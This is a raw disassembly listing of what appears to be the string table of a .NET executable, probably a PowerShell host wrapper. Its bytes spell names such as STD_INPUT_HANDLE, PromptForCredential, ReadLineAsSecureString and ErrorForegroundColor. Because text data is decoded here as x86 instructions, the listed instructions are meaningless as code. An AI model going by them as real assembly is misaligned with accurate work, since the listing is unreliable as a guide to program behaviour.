  407d62:	45                   	inc    %ebp
  407d63:	5f                   	pop    %edi
  407d64:	54                   	push   %esp
  407d65:	59                   	pop    %ecx
  407d66:	50                   	push   %eax
  407d67:	45                   	inc    %ebp
  407d68:	5f                   	pop    %edi
  407d69:	44                   	inc    %esp
  407d6a:	49                   	dec    %ecx
  407d6b:	53                   	push   %ebx
  407d6c:	4b                   	dec    %ebx
  407d6d:	00 46 49             	add    %al,0x49(%esi)
  407d70:	4c                   	dec    %esp
  407d71:	45                   	inc    %ebp
  407d72:	5f                   	pop    %edi
  407d73:	54                   	push   %esp
  407d74:	59                   	pop    %ecx
  407d75:	50                   	push   %eax
  407d76:	45                   	inc    %ebp
  407d77:	5f                   	pop    %edi
  407d78:	43                   	inc    %ebx
  407d79:	48                   	dec    %eax
  407d7a:	41                   	inc    %ecx
  407d7b:	52                   	push   %edx
  407d7c:	00 46 49             	add    %al,0x49(%esi)
  407d7f:	4c                   	dec    %esp
  407d80:	45                   	inc    %ebp
  407d81:	5f                   	pop    %edi
  407d82:	54                   	push   %esp
  407d83:	59                   	pop    %ecx
  407d84:	50                   	push   %eax
  407d85:	45                   	inc    %ebp
  407d86:	5f                   	pop    %edi
  407d87:	50                   	push   %eax
  407d88:	49                   	dec    %ecx
  407d89:	50                   	push   %eax
  407d8a:	45                   	inc    %ebp
  407d8b:	00 46 49             	add    %al,0x49(%esi)
  407d8e:	4c                   	dec    %esp
  407d8f:	45                   	inc    %ebp
  407d90:	5f                   	pop    %edi
  407d91:	54                   	push   %esp
  407d92:	59                   	pop    %ecx
  407d93:	50                   	push   %eax
  407d94:	45                   	inc    %ebp
  407d95:	5f                   	pop    %edi
  407d96:	52                   	push   %edx
  407d97:	45                   	inc    %ebp
  407d98:	4d                   	dec    %ebp
  407d99:	4f                   	dec    %edi
  407d9a:	54                   	push   %esp
  407d9b:	45                   	inc    %ebp
  407d9c:	00 53 54             	add    %dl,0x54(%ebx)
  407d9f:	44                   	inc    %esp
  407da0:	5f                   	pop    %edi
  407da1:	49                   	dec    %ecx
  407da2:	4e                   	dec    %esi
  407da3:	50                   	push   %eax
  407da4:	55                   	push   %ebp
  407da5:	54                   	push   %esp
  407da6:	5f                   	pop    %edi
  407da7:	48                   	dec    %eax
  407da8:	41                   	inc    %ecx
  407da9:	4e                   	dec    %esi
  407daa:	44                   	inc    %esp
  407dab:	4c                   	dec    %esp
  407dac:	45                   	inc    %ebp
  407dad:	00 53 54             	add    %dl,0x54(%ebx)
  407db0:	44                   	inc    %esp
  407db1:	5f                   	pop    %edi
  407db2:	4f                   	dec    %edi
  407db3:	55                   	push   %ebp
  407db4:	54                   	push   %esp
  407db5:	50                   	push   %eax
  407db6:	55                   	push   %ebp
  407db7:	54                   	push   %esp
  407db8:	5f                   	pop    %edi
  407db9:	48                   	dec    %eax
  407dba:	41                   	inc    %ecx
  407dbb:	4e                   	dec    %esi
  407dbc:	44                   	inc    %esp
  407dbd:	4c                   	dec    %esp
  407dbe:	45                   	inc    %ebp
  407dbf:	00 53 54             	add    %dl,0x54(%ebx)
  407dc2:	44                   	inc    %esp
  407dc3:	5f                   	pop    %edi
  407dc4:	45                   	inc    %ebp
  407dc5:	52                   	push   %edx
  407dc6:	52                   	push   %edx
  407dc7:	4f                   	dec    %edi
  407dc8:	52                   	push   %edx
  407dc9:	5f                   	pop    %edi
  407dca:	48                   	dec    %eax
  407dcb:	41                   	inc    %ecx
  407dcc:	4e                   	dec    %esi
  407dcd:	44                   	inc    %esp
  407dce:	4c                   	dec    %esp
  407dcf:	45                   	inc    %ebp
  407dd0:	00 72 61             	add    %dh,0x61(%edx)
  407dd3:	77 55                	ja     0x407e2a
  407dd5:	49                   	dec    %ecx
  407dd6:	00 45 72             	add    %al,0x72(%ebp)
  407dd9:	72 6f                	jb     0x407e4a
  407ddb:	72 46                	jb     0x407e23
  407ddd:	6f                   	outsl  %ds:(%esi),(%dx)
  407dde:	72 65                	jb     0x407e45
  407de0:	67 72 6f             	addr16 jb 0x407e52
  407de3:	75 6e                	jne    0x407e53
  407de5:	64 43                	fs inc %ebx
  407de7:	6f                   	outsl  %ds:(%esi),(%dx)
  407de8:	6c                   	insb   (%dx),%es:(%edi)
  407de9:	6f                   	outsl  %ds:(%esi),(%dx)
  407dea:	72 00                	jb     0x407dec
  407dec:	45                   	inc    %ebp
  407ded:	72 72                	jb     0x407e61
  407def:	6f                   	outsl  %ds:(%esi),(%dx)
  407df0:	72 42                	jb     0x407e34
  407df2:	61                   	popa
  407df3:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407df6:	72 6f                	jb     0x407e67
  407df8:	75 6e                	jne    0x407e68
  407dfa:	64 43                	fs inc %ebx
  407dfc:	6f                   	outsl  %ds:(%esi),(%dx)
  407dfd:	6c                   	insb   (%dx),%es:(%edi)
  407dfe:	6f                   	outsl  %ds:(%esi),(%dx)
  407dff:	72 00                	jb     0x407e01
  407e01:	57                   	push   %edi
  407e02:	61                   	popa
  407e03:	72 6e                	jb     0x407e73
  407e05:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  407e0c:	67 72 6f             	addr16 jb 0x407e7e
  407e0f:	75 6e                	jne    0x407e7f
  407e11:	64 43                	fs inc %ebx
  407e13:	6f                   	outsl  %ds:(%esi),(%dx)
  407e14:	6c                   	insb   (%dx),%es:(%edi)
  407e15:	6f                   	outsl  %ds:(%esi),(%dx)
  407e16:	72 00                	jb     0x407e18
  407e18:	57                   	push   %edi
  407e19:	61                   	popa
  407e1a:	72 6e                	jb     0x407e8a
  407e1c:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  407e23:	67 72 6f             	addr16 jb 0x407e95
  407e26:	75 6e                	jne    0x407e96
  407e28:	64 43                	fs inc %ebx
  407e2a:	6f                   	outsl  %ds:(%esi),(%dx)
  407e2b:	6c                   	insb   (%dx),%es:(%edi)
  407e2c:	6f                   	outsl  %ds:(%esi),(%dx)
  407e2d:	72 00                	jb     0x407e2f
  407e2f:	44                   	inc    %esp
  407e30:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407e34:	46                   	inc    %esi
  407e35:	6f                   	outsl  %ds:(%esi),(%dx)
  407e36:	72 65                	jb     0x407e9d
  407e38:	67 72 6f             	addr16 jb 0x407eaa
  407e3b:	75 6e                	jne    0x407eab
  407e3d:	64 43                	fs inc %ebx
  407e3f:	6f                   	outsl  %ds:(%esi),(%dx)
  407e40:	6c                   	insb   (%dx),%es:(%edi)
  407e41:	6f                   	outsl  %ds:(%esi),(%dx)
  407e42:	72 00                	jb     0x407e44
  407e44:	44                   	inc    %esp
  407e45:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407e49:	42                   	inc    %edx
  407e4a:	61                   	popa
  407e4b:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407e4e:	72 6f                	jb     0x407ebf
  407e50:	75 6e                	jne    0x407ec0
  407e52:	64 43                	fs inc %ebx
  407e54:	6f                   	outsl  %ds:(%esi),(%dx)
  407e55:	6c                   	insb   (%dx),%es:(%edi)
  407e56:	6f                   	outsl  %ds:(%esi),(%dx)
  407e57:	72 00                	jb     0x407e59
  407e59:	56                   	push   %esi
  407e5a:	65 72 62             	gs jb  0x407ebf
  407e5d:	6f                   	outsl  %ds:(%esi),(%dx)
  407e5e:	73 65                	jae    0x407ec5
  407e60:	46                   	inc    %esi
  407e61:	6f                   	outsl  %ds:(%esi),(%dx)
  407e62:	72 65                	jb     0x407ec9
  407e64:	67 72 6f             	addr16 jb 0x407ed6
  407e67:	75 6e                	jne    0x407ed7
  407e69:	64 43                	fs inc %ebx
  407e6b:	6f                   	outsl  %ds:(%esi),(%dx)
  407e6c:	6c                   	insb   (%dx),%es:(%edi)
  407e6d:	6f                   	outsl  %ds:(%esi),(%dx)
  407e6e:	72 00                	jb     0x407e70
  407e70:	56                   	push   %esi
  407e71:	65 72 62             	gs jb  0x407ed6
  407e74:	6f                   	outsl  %ds:(%esi),(%dx)
  407e75:	73 65                	jae    0x407edc
  407e77:	42                   	inc    %edx
  407e78:	61                   	popa
  407e79:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407e7c:	72 6f                	jb     0x407eed
  407e7e:	75 6e                	jne    0x407eee
  407e80:	64 43                	fs inc %ebx
  407e82:	6f                   	outsl  %ds:(%esi),(%dx)
  407e83:	6c                   	insb   (%dx),%es:(%edi)
  407e84:	6f                   	outsl  %ds:(%esi),(%dx)
  407e85:	72 00                	jb     0x407e87
  407e87:	50                   	push   %eax
  407e88:	72 6f                	jb     0x407ef9
  407e8a:	67 72 65             	addr16 jb 0x407ef2
  407e8d:	73 73                	jae    0x407f02
  407e8f:	46                   	inc    %esi
  407e90:	6f                   	outsl  %ds:(%esi),(%dx)
  407e91:	72 65                	jb     0x407ef8
  407e93:	67 72 6f             	addr16 jb 0x407f05
  407e96:	75 6e                	jne    0x407f06
  407e98:	64 43                	fs inc %ebx
  407e9a:	6f                   	outsl  %ds:(%esi),(%dx)
  407e9b:	6c                   	insb   (%dx),%es:(%edi)
  407e9c:	6f                   	outsl  %ds:(%esi),(%dx)
  407e9d:	72 00                	jb     0x407e9f
  407e9f:	50                   	push   %eax
  407ea0:	72 6f                	jb     0x407f11
  407ea2:	67 72 65             	addr16 jb 0x407f0a
  407ea5:	73 73                	jae    0x407f1a
  407ea7:	42                   	inc    %edx
  407ea8:	61                   	popa
  407ea9:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407eac:	72 6f                	jb     0x407f1d
  407eae:	75 6e                	jne    0x407f1e
  407eb0:	64 43                	fs inc %ebx
  407eb2:	6f                   	outsl  %ds:(%esi),(%dx)
  407eb3:	6c                   	insb   (%dx),%es:(%edi)
  407eb4:	6f                   	outsl  %ds:(%esi),(%dx)
  407eb5:	72 00                	jb     0x407eb7
  407eb7:	44                   	inc    %esp
  407eb8:	69 63 74 69 6f 6e 61 	imul   $0x616e6f69,0x74(%ebx),%esp
  407ebf:	72 79                	jb     0x407f3a
  407ec1:	60                   	pusha
  407ec2:	32 00                	xor    (%eax),%al
  407ec4:	50                   	push   %eax
  407ec5:	53                   	push   %ebx
  407ec6:	4f                   	dec    %edi
  407ec7:	62 6a 65             	bound  %ebp,0x65(%edx)
  407eca:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  407ece:	69 65 6c 64 44 65 73 	imul   $0x73654464,0x6c(%ebp),%esp
  407ed5:	63 72 69             	arpl   %esi,0x69(%edx)
  407ed8:	70 74                	jo     0x407f4e
  407eda:	69 6f 6e 00 50 72 6f 	imul   $0x6f725000,0x6e(%edi),%ebp
  407ee1:	6d                   	insl   (%dx),%es:(%edi)
  407ee2:	70 74                	jo     0x407f58
  407ee4:	00 50 72             	add    %dl,0x72(%eax)
  407ee7:	6f                   	outsl  %ds:(%esi),(%dx)
  407ee8:	6d                   	insl   (%dx),%es:(%edi)
  407ee9:	70 74                	jo     0x407f5f
  407eeb:	46                   	inc    %esi
  407eec:	6f                   	outsl  %ds:(%esi),(%dx)
  407eed:	72 43                	jb     0x407f32
  407eef:	68 6f 69 63 65       	push   $0x6563696f
  407ef4:	00 50 53             	add    %dl,0x53(%eax)
  407ef7:	43                   	inc    %ebx
  407ef8:	72 65                	jb     0x407f5f
  407efa:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407efd:	74 69                	je     0x407f68
  407eff:	61                   	popa
  407f00:	6c                   	insb   (%dx),%es:(%edi)
  407f01:	00 50 72             	add    %dl,0x72(%eax)
  407f04:	6f                   	outsl  %ds:(%esi),(%dx)
  407f05:	6d                   	insl   (%dx),%es:(%edi)
  407f06:	70 74                	jo     0x407f7c
  407f08:	46                   	inc    %esi
  407f09:	6f                   	outsl  %ds:(%esi),(%dx)
  407f0a:	72 43                	jb     0x407f4f
  407f0c:	72 65                	jb     0x407f73
  407f0e:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407f11:	74 69                	je     0x407f7c
  407f13:	61                   	popa
  407f14:	6c                   	insb   (%dx),%es:(%edi)
  407f15:	00 67 65             	add    %ah,0x65(%edi)
  407f18:	74 5f                	je     0x407f79
  407f1a:	52                   	push   %edx
  407f1b:	61                   	popa
  407f1c:	77 55                	ja     0x407f73
  407f1e:	49                   	dec    %ecx
  407f1f:	00 69 62             	add    %ch,0x62(%ecx)
  407f22:	5f                   	pop    %edi
  407f23:	63 61 70             	arpl   %esp,0x70(%ecx)
  407f26:	74 69                	je     0x407f91
  407f28:	6f                   	outsl  %ds:(%esi),(%dx)
  407f29:	6e                   	outsb  %ds:(%esi),(%dx)
  407f2a:	00 69 62             	add    %ch,0x62(%ecx)
  407f2d:	5f                   	pop    %edi
  407f2e:	6d                   	insl   (%dx),%es:(%edi)
  407f2f:	65 73 73             	gs jae 0x407fa5
  407f32:	61                   	popa
  407f33:	67 65 00 52 65       	add    %dl,%gs:0x65(%bp,%si)
  407f38:	61                   	popa
  407f39:	64 4c                	fs dec %esp
  407f3b:	69 6e 65 00 53 79 73 	imul   $0x73795300,0x65(%esi),%ebp
  407f42:	74 65                	je     0x407fa9
  407f44:	6d                   	insl   (%dx),%es:(%edi)
  407f45:	2e 53                	cs push %ebx
  407f47:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407f4b:	69 74 79 00 53 65 63 	imul   $0x75636553,0x0(%ecx,%edi,2),%esi
  407f52:	75 
  407f53:	72 65                	jb     0x407fba
  407f55:	53                   	push   %ebx
  407f56:	74 72                	je     0x407fca
  407f58:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  407f5f:	50                   	push   %eax
  407f60:	61                   	popa
  407f61:	73 73                	jae    0x407fd6
  407f63:	77 6f                	ja     0x407fd4
  407f65:	72 64                	jb     0x407fcb
  407f67:	00 52 65             	add    %dl,0x65(%edx)
  407f6a:	61                   	popa
  407f6b:	64 4c                	fs dec %esp
  407f6d:	69 6e 65 41 73 53 65 	imul   $0x65537341,0x65(%esi),%ebp
  407f74:	63 75 72             	arpl   %esi,0x72(%ebp)
  407f77:	65 53                	gs push %ebx
  407f79:	74 72                	je     0x407fed
  407f7b:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  407f82:	74 65                	je     0x407fe9
  407f84:	00 57 72             	add    %dl,0x72(%edi)
  407f87:	69 74 65 44 65 62 75 	imul   $0x67756265,0x44(%ebp,%eiz,2),%esi
  407f8e:	67 
  407f8f:	4c                   	dec    %esp
  407f90:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  407f97:	74 65                	je     0x407ffe
  407f99:	45                   	inc    %ebp
  407f9a:	72 72                	jb     0x40800e
  407f9c:	6f                   	outsl  %ds:(%esi),(%dx)
  407f9d:	72 4c                	jb     0x407feb
  407f9f:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  407fa6:	74 65                	je     0x40800d
  407fa8:	4c                   	dec    %esp
  407fa9:	69 6e 65 00 70 66 00 	imul   $0x667000,0x65(%esi),%ebp
  407fb0:	57                   	push   %edi
  407fb1:	72 69                	jb     0x40801c
  407fb3:	74 65                	je     0x40801a
  407fb5:	50                   	push   %eax
  407fb6:	72 6f                	jb     0x408027
  407fb8:	67 72 65             	addr16 jb 0x408020
  407fbb:	73 73                	jae    0x408030
  407fbd:	00 57 72             	add    %dl,0x72(%edi)
  407fc0:	69 74 65 56 65 72 62 	imul   $0x6f627265,0x56(%ebp,%eiz,2),%esi
  407fc7:	6f 
  407fc8:	73 65                	jae    0x40802f
  407fca:	4c                   	dec    %esp
  407fcb:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  407fd2:	74 65                	je     0x408039
  407fd4:	57                   	push   %edi
  407fd5:	61                   	popa
  407fd6:	72 6e                	jb     0x408046
  407fd8:	69 6e 67 4c 69 6e 65 	imul   $0x656e694c,0x67(%esi),%ebp
  407fdf:	00 52 61             	add    %dl,0x61(%edx)
  407fe2:	77 55                	ja     0x408039
  407fe4:	49                   	dec    %ecx
  407fe5:	00 70 61             	add    %dh,0x61(%eax)
  407fe8:	72 65                	jb     0x40804f
  407fea:	6e                   	outsb  %ds:(%esi),(%dx)
  407feb:	74 00                	je     0x407fed
  407fed:	75 69                	jne    0x408058
  407fef:	00 53 79             	add    %dl,0x79(%ebx)
  407ff2:	73 74                	jae    0x408068
  407ff4:	65 6d                	gs insl (%dx),%es:(%edi)
  407ff6:	2e 47                	cs inc %edi
  407ff8:	6c                   	insb   (%dx),%es:(%edi)
  407ff9:	6f                   	outsl  %ds:(%esi),(%dx)
  407ffa:	62 61 6c             	bound  %esp,0x6c(%ecx)
  407ffd:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  408004:	00 43 75             	add    %al,0x75(%ebx)
  408007:	6c                   	insb   (%dx),%es:(%edi)
  408008:	74 75                	je     0x40807f
  40800a:	72 65                	jb     0x408071
  40800c:	49                   	dec    %ecx
  40800d:	6e                   	outsb  %ds:(%esi),(%dx)
  40800e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408010:	00 6f 72             	add    %ch,0x72(%edi)
  408013:	69 67 69 6e 61 6c 43 	imul   $0x436c616e,0x69(%edi),%esp
  40801a:	75 6c                	jne    0x408088
  40801c:	74 75                	je     0x408093
  40801e:	72 65                	jb     0x408085
  408020:	49                   	dec    %ecx
  408021:	6e                   	outsb  %ds:(%esi),(%dx)
  408022:	66 6f                	outsw  %ds:(%esi),(%dx)
  408024:	00 6f 72             	add    %ch,0x72(%edi)
  408027:	69 67 69 6e 61 6c 55 	imul   $0x556c616e,0x69(%edi),%esp
  40802e:	49                   	dec    %ecx
  40802f:	43                   	inc    %ebx
  408030:	75 6c                	jne    0x40809e
  408032:	74 75                	je     0x4080a9
  408034:	72 65                	jb     0x40809b
  408036:	49                   	dec    %ecx
  408037:	6e                   	outsb  %ds:(%esi),(%dx)
  408038:	66 6f                	outsw  %ds:(%esi),(%dx)
  40803a:	00 47 75             	add    %al,0x75(%edi)
  40803d:	69 64 00 6d 79 49 64 	imul   $0x644979,0x6d(%eax,%eax,1),%esp
  408044:	00 
  408045:	67 65 74 5f          	addr16 gs je 0x4080a8
  408049:	50                   	push   %eax
  40804a:	72 69                	jb     0x4080b5
  40804c:	76 61                	jbe    0x4080af
  40804e:	74 65                	je     0x4080b5
  408050:	44                   	inc    %esp
  408051:	61                   	popa
  408052:	74 61                	je     0x4080b5
  408054:	00 5f 63             	add    %bl,0x63(%edi)
  408057:	6f                   	outsl  %ds:(%esi),(%dx)
  408058:	6e                   	outsb  %ds:(%esi),(%dx)
  408059:	73 6f                	jae    0x4080ca
  40805b:	6c                   	insb   (%dx),%es:(%edi)
  40805c:	65 43                	gs inc %ebx
  40805e:	6f                   	outsl  %ds:(%esi),(%dx)
  40805f:	6c                   	insb   (%dx),%es:(%edi)
  408060:	6f                   	outsl  %ds:(%esi),(%dx)
  408061:	72 50                	jb     0x4080b3
  408063:	72 6f                	jb     0x4080d4
  408065:	78 79                	js     0x4080e0
  408067:	00 67 65             	add    %ah,0x65(%edi)
  40806a:	74 5f                	je     0x4080cb
  40806c:	43                   	inc    %ebx
  40806d:	75 72                	jne    0x4080e1
  40806f:	72 65                	jb     0x4080d6
  408071:	6e                   	outsb  %ds:(%esi),(%dx)
  408072:	74 43                	je     0x4080b7
  408074:	75 6c                	jne    0x4080e2
  408076:	74 75                	je     0x4080ed
  408078:	72 65                	jb     0x4080df
  40807a:	00 67 65             	add    %ah,0x65(%edi)
  40807d:	74 5f                	je     0x4080de
  40807f:	43                   	inc    %ebx
  408080:	75 72                	jne    0x4080f4
  408082:	72 65                	jb     0x4080e9
  408084:	6e                   	outsb  %ds:(%esi),(%dx)
  408085:	74 55                	je     0x4080dc
  408087:	49                   	dec    %ecx
  408088:	43                   	inc    %ebx
  408089:	75 6c                	jne    0x4080f7
  40808b:	74 75                	je     0x408102
  40808d:	72 65                	jb     0x4080f4
  40808f:	00 67 65             	add    %ah,0x65(%edi)
  408092:	74 5f                	je     0x4080f3
  408094:	49                   	dec    %ecx
  408095:	6e                   	outsb  %ds:(%esi),(%dx)
  408096:	73 74                	jae    0x40810c
  408098:	61                   	popa
  408099:	6e                   	outsb  %ds:(%esi),(%dx)
  40809a:	63 65 49             	arpl   %esp,0x49(%ebp)
  40809d:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  4080a1:	74 5f                	je     0x408102
  4080a3:	4e                   	dec    %esi
  4080a4:	61                   	popa
  4080a5:	6d                   	insl   (%dx),%es:(%edi)
  4080a6:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4080aa:	74 5f                	je     0x40810b
  4080ac:	55                   	push   %ebp
  4080ad:	49                   	dec    %ecx
  4080ae:	00 56 65             	add    %dl,0x65(%esi)
  4080b1:	72 73                	jb     0x408126
  4080b3:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  4080ba:	5f                   	pop    %edi
  4080bb:	56                   	push   %esi
  4080bc:	65 72 73             	gs jb  0x408132
  4080bf:	69 6f 6e 00 45 6e 74 	imul   $0x746e4500,0x6e(%edi),%ebp
  4080c6:	65 72 4e             	gs jb  0x408117
  4080c9:	65 73 74             	gs jae 0x408140
  4080cc:	65 64 50             	gs fs push %eax
  4080cf:	72 6f                	jb     0x408140
  4080d1:	6d                   	insl   (%dx),%es:(%edi)
  4080d2:	70 74                	jo     0x408148
  4080d4:	00 45 78             	add    %al,0x78(%ebp)
  4080d7:	69 74 4e 65 73 74 65 	imul   $0x64657473,0x65(%esi,%ecx,2),%esi
  4080de:	64 
  4080df:	50                   	push   %eax
  4080e0:	72 6f                	jb     0x408151
  4080e2:	6d                   	insl   (%dx),%es:(%edi)
  4080e3:	70 74                	jo     0x408159
  4080e5:	00 4e 6f             	add    %cl,0x6f(%esi)
  4080e8:	74 69                	je     0x408153
  4080ea:	66 79 42             	data16 jns 0x40812f
  4080ed:	65 67 69 6e 41 70 70 	imul   $0x696c7070,%gs:0x41(%bp),%ebp
  4080f4:	6c 69 
  4080f6:	63 61 74             	arpl   %esp,0x74(%ecx)
  4080f9:	69 6f 6e 00 4e 6f 74 	imul   $0x746f4e00,0x6e(%edi),%ebp
  408100:	69 66 79 45 6e 64 41 	imul   $0x41646e45,0x79(%esi),%esp
  408107:	70 70                	jo     0x408179
  408109:	6c                   	insb   (%dx),%es:(%edi)
  40810a:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408111:	00 53 65             	add    %dl,0x65(%ebx)
  408114:	74 53                	je     0x408169
  408116:	68 6f 75 6c 64       	push   $0x646c756f
  40811b:	45                   	inc    %ebp
  40811c:	78 69                	js     0x408187
  40811e:	74 00                	je     0x408120
  408120:	50                   	push   %eax
  408121:	72 69                	jb     0x40818c
  408123:	76 61                	jbe    0x408186
  408125:	74 65                	je     0x40818c
  408127:	44                   	inc    %esp
  408128:	61                   	popa
  408129:	74 61                	je     0x40818c
  40812b:	00 43 75             	add    %al,0x75(%ebx)
  40812e:	72 72                	jb     0x4081a2
  408130:	65 6e                	outsb  %gs:(%esi),(%dx)
  408132:	74 43                	je     0x408177
  408134:	75 6c                	jne    0x4081a2
  408136:	74 75                	je     0x4081ad
  408138:	72 65                	jb     0x40819f
  40813a:	00 43 75             	add    %al,0x75(%ebx)
  40813d:	72 72                	jb     0x4081b1
  40813f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408141:	74 55                	je     0x408198
  408143:	49                   	dec    %ecx
  408144:	43                   	inc    %ebx
  408145:	75 6c                	jne    0x4081b3
  408147:	74 75                	je     0x4081be
  408149:	72 65                	jb     0x4081b0
  40814b:	00 49 6e             	add    %cl,0x6e(%ecx)
  40814e:	73 74                	jae    0x4081c4
  408150:	61                   	popa
  408151:	6e                   	outsb  %ds:(%esi),(%dx)
  408152:	63 65 49             	arpl   %esp,0x49(%ebp)
  408155:	64 00 4e 61          	add    %cl,%fs:0x61(%esi)
  408159:	6d                   	insl   (%dx),%es:(%edi)
  40815a:	65 00 55 49          	add    %dl,%gs:0x49(%ebp)
  40815e:	00 5f 75             	add    %bl,0x75(%edi)
  408161:	69 00 67 65 74 5f    	imul   $0x5f746567,(%eax),%eax
  408167:	45                   	inc    %ebp
  408168:	72 72                	jb     0x4081dc
  40816a:	6f                   	outsl  %ds:(%esi),(%dx)
  40816b:	72 46                	jb     0x4081b3
  40816d:	6f                   	outsl  %ds:(%esi),(%dx)
  40816e:	72 65                	jb     0x4081d5
  408170:	67 72 6f             	addr16 jb 0x4081e2
  408173:	75 6e                	jne    0x4081e3
  408175:	64 43                	fs inc %ebx
  408177:	6f                   	outsl  %ds:(%esi),(%dx)
  408178:	6c                   	insb   (%dx),%es:(%edi)
  408179:	6f                   	outsl  %ds:(%esi),(%dx)
  40817a:	72 00                	jb     0x40817c
  40817c:	73 65                	jae    0x4081e3
  40817e:	74 5f                	je     0x4081df
  408180:	45                   	inc    %ebp
  408181:	72 72                	jb     0x4081f5
  408183:	6f                   	outsl  %ds:(%esi),(%dx)
  408184:	72 46                	jb     0x4081cc
  408186:	6f                   	outsl  %ds:(%esi),(%dx)
  408187:	72 65                	jb     0x4081ee
  408189:	67 72 6f             	addr16 jb 0x4081fb
  40818c:	75 6e                	jne    0x4081fc
  40818e:	64 43                	fs inc %ebx
  408190:	6f                   	outsl  %ds:(%esi),(%dx)
  408191:	6c                   	insb   (%dx),%es:(%edi)
  408192:	6f                   	outsl  %ds:(%esi),(%dx)
  408193:	72 00                	jb     0x408195
  408195:	67 65 74 5f          	addr16 gs je 0x4081f8
  408199:	45                   	inc    %ebp
  40819a:	72 72                	jb     0x40820e
  40819c:	6f                   	outsl  %ds:(%esi),(%dx)
  40819d:	72 42                	jb     0x4081e1
  40819f:	61                   	popa
  4081a0:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4081a3:	72 6f                	jb     0x408214
  4081a5:	75 6e                	jne    0x408215
  4081a7:	64 43                	fs inc %ebx
  4081a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4081aa:	6c                   	insb   (%dx),%es:(%edi)
  4081ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ac:	72 00                	jb     0x4081ae
  4081ae:	73 65                	jae    0x408215
  4081b0:	74 5f                	je     0x408211
  4081b2:	45                   	inc    %ebp
  4081b3:	72 72                	jb     0x408227
  4081b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4081b6:	72 42                	jb     0x4081fa
  4081b8:	61                   	popa
  4081b9:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4081bc:	72 6f                	jb     0x40822d
  4081be:	75 6e                	jne    0x40822e
  4081c0:	64 43                	fs inc %ebx
  4081c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c3:	6c                   	insb   (%dx),%es:(%edi)
  4081c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c5:	72 00                	jb     0x4081c7
  4081c7:	67 65 74 5f          	addr16 gs je 0x40822a
  4081cb:	57                   	push   %edi
  4081cc:	61                   	popa
  4081cd:	72 6e                	jb     0x40823d
  4081cf:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  4081d6:	67 72 6f             	addr16 jb 0x408248
  4081d9:	75 6e                	jne    0x408249
  4081db:	64 43                	fs inc %ebx
  4081dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4081de:	6c                   	insb   (%dx),%es:(%edi)
  4081df:	6f                   	outsl  %ds:(%esi),(%dx)
  4081e0:	72 00                	jb     0x4081e2
  4081e2:	73 65                	jae    0x408249
  4081e4:	74 5f                	je     0x408245
  4081e6:	57                   	push   %edi
  4081e7:	61                   	popa
  4081e8:	72 6e                	jb     0x408258
  4081ea:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  4081f1:	67 72 6f             	addr16 jb 0x408263
  4081f4:	75 6e                	jne    0x408264
  4081f6:	64 43                	fs inc %ebx
  4081f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4081f9:	6c                   	insb   (%dx),%es:(%edi)
  4081fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4081fb:	72 00                	jb     0x4081fd
  4081fd:	67 65 74 5f          	addr16 gs je 0x408260
  408201:	57                   	push   %edi
  408202:	61                   	popa
  408203:	72 6e                	jb     0x408273
  408205:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  40820c:	67 72 6f             	addr16 jb 0x40827e
  40820f:	75 6e                	jne    0x40827f
  408211:	64 43                	fs inc %ebx
  408213:	6f                   	outsl  %ds:(%esi),(%dx)
  408214:	6c                   	insb   (%dx),%es:(%edi)
  408215:	6f                   	outsl  %ds:(%esi),(%dx)
  408216:	72 00                	jb     0x408218
  408218:	73 65                	jae    0x40827f
  40821a:	74 5f                	je     0x40827b
  40821c:	57                   	push   %edi
  40821d:	61                   	popa
  40821e:	72 6e                	jb     0x40828e
  408220:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  408227:	67 72 6f             	addr16 jb 0x408299
  40822a:	75 6e                	jne    0x40829a
  40822c:	64 43                	fs inc %ebx
  40822e:	6f                   	outsl  %ds:(%esi),(%dx)
  40822f:	6c                   	insb   (%dx),%es:(%edi)
  408230:	6f                   	outsl  %ds:(%esi),(%dx)
  408231:	72 00                	jb     0x408233
  408233:	67 65 74 5f          	addr16 gs je 0x408296
  408237:	44                   	inc    %esp
  408238:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40823c:	46                   	inc    %esi
  40823d:	6f                   	outsl  %ds:(%esi),(%dx)
  40823e:	72 65                	jb     0x4082a5
